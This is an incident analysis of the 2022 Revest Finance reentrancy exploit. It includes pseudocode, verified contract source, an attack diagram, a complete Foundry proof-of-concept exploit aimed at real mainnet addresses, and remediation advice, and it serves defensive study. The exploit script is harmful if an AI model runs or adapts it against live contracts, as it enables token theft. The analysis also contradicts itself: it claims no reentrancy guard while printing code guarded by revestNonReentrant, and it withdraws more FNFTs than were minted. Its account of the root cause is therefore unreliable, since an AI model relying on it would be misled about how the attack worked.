# Revest Finance — FNFT mintAddressLock Reentrancy Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-03-27 |
| **Protocol** | Revest Finance |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$2,000,000 (RENA tokens) |
| **Attacker** | Attacker address unidentified |
| **Vulnerable Contract** | Revest [0x2320A28f52334d62622cc2EaFa15DE55F9987eD9](https://etherscan.io/address/0x2320A28f52334d62622cc2EaFa15DE55F9987eD9) |
| **Root Cause** | During `withdrawFNFT()` execution, an ERC1155 `onERC1155Received` callback is triggered; within this callback, `depositAdditionalToFNFT()` can be reentered to inflate FNFT balances at minimal cost |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Revest_exp.sol) |

---
## 1. Vulnerability Overview

Revest Finance provides token lock/unlock functionality via ERC1155-based Financial NFTs (FNFTs). The `mintAddressLock()` function creates FNFTs, while `withdrawFNFT()` burns expired FNFTs to reclaim tokens.

During `withdrawFNFT()` execution, the ERC1155 burn process triggers an `onERC1155Received` callback. The attacker exploited this callback to call `depositAdditionalToFNFT()`, injecting additional balance into an FNFT already being withdrawn. A subsequent `withdrawFNFT()` call could then drain both the injected additional balance and the original balance.

The key insight is that the callback fires before the fnftId's balance is burned during withdrawal, allowing the balance to be inflated at the pre-burn moment.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Revest.withdrawFNFT() (pseudocode)
contract Revest {

    function withdrawFNFT(uint256 fnftId, uint256 quantity) external {
        // Check whether unlock is possible
        require(isUnlockable(fnftId), "FNFT not unlockable");

        // ❌ ERC1155 burn: triggers onERC1155Received callback
        // depositAdditionalToFNFT() can be reentered within this callback
        IERC1155(fnftHandler).safeTransferFrom(
            msg.sender,
            address(this),
            fnftId,
            quantity,
            ""
        );

        // ❌ Token transfer occurs after the callback
        // Attacker can inflate balance in the callback and receive more tokens
        uint256 amount = fnftRecord[fnftId].depositAmount * quantity;
        IERC20(fnftRecord[fnftId].asset).transfer(msg.sender, amount);
    }

    function depositAdditionalToFNFT(
        uint256 fnftId,
        uint256 amount,
        uint256 quantity
    ) external {
        // ❌ No reentrancy guard
        IERC20(fnftRecord[fnftId].asset).transferFrom(msg.sender, address(this), amount);
        fnftRecord[fnftId].depositAmount += amount / fnftRecord[fnftId].quantity;
    }
}

// ✅ Correct pattern
contract RevestFixed {
    bool private locked;
    modifier nonReentrant() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }

    function withdrawFNFT(uint256 fnftId, uint256 quantity) external nonReentrant {
        require(isUnlockable(fnftId));
        // ✅ Update state first
        uint256 amount = fnftRecord[fnftId].depositAmount * quantity;
        fnftRecord[fnftId].depositAmount = 0;
        // Then make external calls
        IERC1155(fnftHandler).burn(msg.sender, fnftId, quantity);
        IERC20(fnftRecord[fnftId].asset).transfer(msg.sender, amount);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**Revest.sol** — Entry point / vulnerable location:
```solidity
// ❌ Root cause: During `withdrawFNFT()` execution, an ERC1155 `onERC1155Received` callback is triggered, and `depositAdditionalToFNFT()` can be reentered within this callback
    function withdrawFNFT(uint fnftId, uint quantity) external override revestNonReentrant(fnftId) {  // ❌ Vulnerability
        address fnftHandler = addressesProvider.getRevestFNFT();
        // Check if this many FNFTs exist in the first place for the given ID
        require(quantity <= IFNFTHandler(fnftHandler).getSupply(fnftId), "E022");
        // Check if the user making this call has this many FNFTs to cash in
        require(quantity <= IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId), "E006");
        // Check if the user making this call has any FNFT's
        require(IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId) > 0, "E032");

        IRevest.LockType lockType = getLockManager().lockTypes(fnftId);
        require(lockType != IRevest.LockType.DoesNotExist, "E007");
        require(getLockManager().unlockFNFT(fnftId, _msgSender()),
            lockType == IRevest.LockType.TimeLock ? "E010" :
            lockType == IRevest.LockType.ValueLock ? "E018" : "E019");
        // Burn the FNFTs being exchanged
        burn(_msgSender(), fnftId, quantity);
        getTokenVault().withdrawToken(fnftId, quantity, _msgSender());

        emit FNFTWithdrawn(_msgSender(), fnftId, quantity);
    }

    function depositAdditionalToFNFT(
        uint fnftId,
        uint amount,
        uint quantity
    ) external override returns (uint) {
        IRevest.FNFTConfig memory fnft = getTokenVault().getFNFT(fnftId);
        require(fnftId < getFNFTHandler().getNextId(), "E007");
        require(fnft.isMulti, "E034");
        require(fnft.depositStopTime < block.timestamp || fnft.depositStopTime == 0, "E035");
        require(quantity > 0, "E070");

        address vault = addressesProvider.getTokenVault();
        address handler = addressesProvider.getRevestFNFT();
        address lockHandler = addressesProvider.getLockManager();

    // ... (truncated)
        }

        // Will call updateBalance
        ITokenVault(vault).depositToken(fnftId, amount, quantity);
        // Now, we transfer to the token vault
        if(fnft.asset != address(0)){
            IERC20(fnft.asset).safeTransferFrom(_msgSender(), vault, quantity * amount);
        }

        ITokenVault(vault).handleMultipleDeposits(fnftId, newFNFTId, fnft.depositAmount + amount);

        emit FNFTAddionalDeposited(_msgSender(), newFNFTId, quantity, amount);

        return newFNFTId;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (implements onERC1155Received)
    │
    ├─[1] Flash loan: borrow 5e18 RENA
    │
    ├─[2] Call Revest.mintAddressLock()
    │       FNFT #1: quantity=2, depositAmount=1e18 each (total 2e18)
    │       FNFT #2: quantity=360,000, depositAmount=1 wei each
    │
    ├─[3] Call Revest.withdrawFNFT(fnft#2, 360,001)
    │       ERC1155.safeTransferFrom() executes
    │       ↓ onERC1155Received callback fires
    │           │
    │           └─ [Reentrant] depositAdditionalToFNFT(fnft#2, 1e18, ...)
    │                   Injects 1e18 into fnft#2's depositAmount
    │                   Callback returns
    │
    ├─[4] withdrawFNFT continues: withdraws tokens with inflated depositAmount
    │       Withdrawn amount = 360,001 × (original 1wei + injected amount) → large RENA received
    │
    └─[5] Repay flash loan + transfer net profit
            Loss: ~$2,000,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IRevest {
    function mintAddressLock(
        address trigger,
        bytes memory arguments,
        address[] memory destinations,
        uint256[] memory quantities,
        IRevest.FNFTConfig memory fnftConfig
    ) external payable returns (uint256);

    function withdrawFNFT(uint256 fnftId, uint256 quantity) external;

    function depositAdditionalToFNFT(
        uint256 fnftId,
        uint256 amount,
        uint256 quantity
    ) external returns (uint256);

    struct FNFTConfig {
        address asset;
        address pipeToContract;
        uint256 depositAmount;
        uint256 depositMul;
        uint256 split;
        uint256 maturityExtension;
        bool isMulti;
        bool nontransferrable;
    }
}

contract ContractTest is Test {
    IUniswapV2Pair pair  = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
    IERC20 RENA          = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
    IRevest revest       = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);

    uint256 fnft1;
    uint256 fnft2;
    bool reentrant = false;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_465_356);
    }

    function testExploit() public {
        // [Step 1] Initiate flash loan
        pair.swap(5e18, 0, address(this), "0x");
        emit log_named_decimal_uint("[Profit] RENA", RENA.balanceOf(address(this)), 18);
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        RENA.approve(address(revest), type(uint256).max);

        // [Step 2] Mint two FNFTs
        address[] memory dests = new address[](1);
        dests[0] = address(this);
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 2;

        IRevest.FNFTConfig memory config = IRevest.FNFTConfig({
            asset: address(RENA),
            pipeToContract: address(0),
            depositAmount: 1e18,
            depositMul: 0, split: 0, maturityExtension: 0,
            isMulti: false, nontransferrable: false
        });
        fnft1 = revest.mintAddressLock(address(this), "", dests, quantities, config);

        quantities[0] = 360_000;
        config.depositAmount = 1;
        fnft2 = revest.mintAddressLock(address(this), "", dests, quantities, config);

        // [Step 3] withdrawFNFT → reenter via onERC1155Received callback
        revest.withdrawFNFT(fnft2, 360_001);

        // [Step 4] Repay flash loan
        uint256 repay = (amount0 * 1000 / 997) + 1;
        RENA.transfer(address(pair), repay);
    }

    // ERC1155 receive callback: automatically invoked during withdrawFNFT execution
    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external returns (bytes4)
    {
        if (!reentrant) {
            reentrant = true;
            // ⚡ Reenter: inflate FNFT balance
            revest.depositAdditionalToFNFT(fnft2, 1e18, 1);
            reentrant = false;
        }
        return this.onERC1155Received.selector;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (ERC1155 callback reentrancy) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | NFT callback-based reentrancy |
| **Attack Vector** | withdrawFNFT → onERC1155Received → depositAdditionalToFNFT |
| **Precondition** | nonReentrant not applied to Revest |
| **Impact** | Arbitrary FNFT balance inflation → mass token withdrawal |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply `nonReentrant` to asset-moving functions such as `withdrawFNFT` and `depositAdditionalToFNFT`.
2. **CEI Pattern**: Set the FNFT balance to 0 before transferring tokens.
3. **ERC1155 Callback Awareness**: `safeTransferFrom` invokes `onERC1155Received` on the recipient. Always treat this as a potential reentrancy vector.
4. **FNFT Balance Update Timing**: `depositAdditionalToFNFT` must lock state first so it cannot be applied to an FNFT already being withdrawn.

---
## 7. Lessons Learned

- **ERC1155 Reentrancy**: The `safeTransfer` family of functions in ERC721 and ERC1155 always triggers a recipient callback. This constitutes a reentrancy vector.
- **Specifics of NFT Protocols**: NFT-based DeFi has a broader reentrancy surface than ERC20-based protocols due to multiple callback mechanisms.
- **$2M Loss**: A representative reentrancy attack case from early 2022 involving an NFT-DeFi hybrid protocol.